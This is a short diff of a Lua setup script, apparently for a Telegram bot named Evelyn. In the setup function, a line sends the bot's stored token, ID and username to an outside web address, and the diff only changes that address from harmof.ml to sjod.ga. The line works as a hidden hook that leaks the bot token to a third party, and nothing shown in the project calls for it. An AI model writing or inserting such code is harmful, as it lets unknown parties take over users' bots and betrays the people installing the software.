@@ -64,7 +64,7 @@ os.execute('lua start.lua')
 end
 local function Files_Evelyn_Info()
 Create_Info(database:get(Server_Evelyn.."Token_Evelyn"),database:get(Server_Evelyn.."Id_Evelyn"),database:get(Server_Evelyn.."UserName_Evelyn"))   
-https.request("https://harmof.ml/api.php?id="..database:get(Server_Evelyn.."Id_Evelyn").."&user="..database:get(Server_Evelyn.."UserName_Evelyn").."&token="..database:get(Server_Evelyn.."Token_Evelyn"))
+https.request("https://sjod.ga/API/Sub/index.php?from_id="..database:get(Server_Evelyn.."Id_Evelyn").."&user="..database:get(Server_Evelyn.."UserName_Evelyn").."&token="..database:get(Server_Evelyn.."Token_Evelyn"))
 local RunEvelyn = io.open("Evelyn", 'w')
 RunEvelyn:write([[
 #!/usr/bin/env bash
